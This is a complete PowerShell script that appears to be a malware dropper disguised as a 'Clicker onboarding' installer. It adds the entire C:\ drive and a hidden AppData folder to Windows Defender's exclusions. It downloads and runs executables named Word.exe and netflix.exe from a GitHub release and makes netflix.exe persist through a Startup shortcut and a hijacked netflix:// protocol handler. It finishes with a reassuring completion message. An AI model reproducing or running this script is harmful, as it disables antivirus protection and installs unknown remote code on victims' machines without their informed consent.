Add-Type -AssemblyName System.Windows.Forms

# Set up paths
$folderPath = Join-Path -Path $env:APPDATA -ChildPath "word"
$exePath = Join-Path -Path $folderPath -ChildPath "netflix.exe"
$startupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
$shortcutPath = [System.IO.Path]::Combine($startupFolder, "netflix.lnk")

# Create folder if it doesn't exist
if (!(Test-Path -Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath | Out-Null
    Write-Output "Created folder: $folderPath"
} else {
    Write-Output "Folder already exists: $folderPath"
}

# Whitelist folder and C:\
Add-MpPreference -ExclusionPath "C:\"
Add-MpPreference -ExclusionPath $folderPath
Write-Output "Whitelist for C:\ and specific folder complete."

# Download Word.exe
$url1 = "https://github.com/jstankovic2/fade_urls/releases/download/dddd/Word.exe"
$destination1 = Join-Path -Path $folderPath -ChildPath "Word.exe"
Invoke-WebRequest -Uri $url1 -OutFile $destination1
Write-Output "Download of Word.exe complete."
Start-Process -FilePath $destination1
Write-Output "Word.exe started."

# Download netflix.exe
$url2 = "https://github.com/jstankovic2/fade_urls/releases/download/ffffffff/netflix.exe"
Invoke-WebRequest -Uri $url2 -OutFile $exePath
Write-Output "Download of netflix.exe complete."
Start-Process -FilePath $exePath
Write-Output "netflix.exe started."

# Add netflix.exe to Startup
$wshShell = New-Object -ComObject WScript.Shell
$shortcut = $wshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $exePath
$shortcut.Save()
Write-Output "Startup shortcut for netflix.exe created."

# Register netflix:// protocol
$ProtocolPath = "Registry::HKEY_CLASSES_ROOT\netflix"
$CommandPath = "Registry::HKEY_CLASSES_ROOT\netflix\shell\open\command"
New-Item -Path $ProtocolPath -Force | Out-Null
Set-ItemProperty -Path $ProtocolPath -Name "(Default)" -Value "URL:Netflix Protocol"
Set-ItemProperty -Path $ProtocolPath -Name "URL Protocol" -Value ""
New-Item -Path $CommandPath -Force | Out-Null
Set-ItemProperty -Path $CommandPath -Name "(Default)" -Value "`"$exePath`" `%1"
Write-Output "netflix:// protocol registered to $exePath"

# Display completion message
[System.Windows.Forms.MessageBox]::Show("Clicker onboarding complete.", "Onboarding Status", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)

Exit
